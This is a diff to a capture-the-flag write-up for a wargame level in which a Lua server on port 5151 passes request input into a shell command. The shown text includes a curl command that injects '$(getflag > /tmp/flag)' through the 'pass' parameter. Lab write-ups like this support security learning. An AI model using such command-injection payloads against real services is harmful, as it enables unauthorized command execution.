@@ -45,9 +45,9 @@ This Lua script is a server listening on the port `5151` waiting for request wit
 We want to see who launched this:
 ```shell
 $ ps aux | grep lua
-1783  0.0  0.0   3016   980 ?        S    14:00   0:00 lua /home/user/level11/level11.lua
+flag11  1783  0.0  0.0   3016   980 ?        S    14:00   0:00 lua /home/user/level11/level11.lua
 ```
-So user flag11 launched this. Fortunately, we see it concatenates the value send by the request to a shell command. We can try to do an injection maybe ? \
+So user flag11 launched this. Fortunately, we see it concatenates the value send by the request to a shell command. We can try to do an injection maybe ?
 ```shell
 $ curl localhost:5151?pass='$(getflag > /tmp/flag)'
 Password: Erf nope..
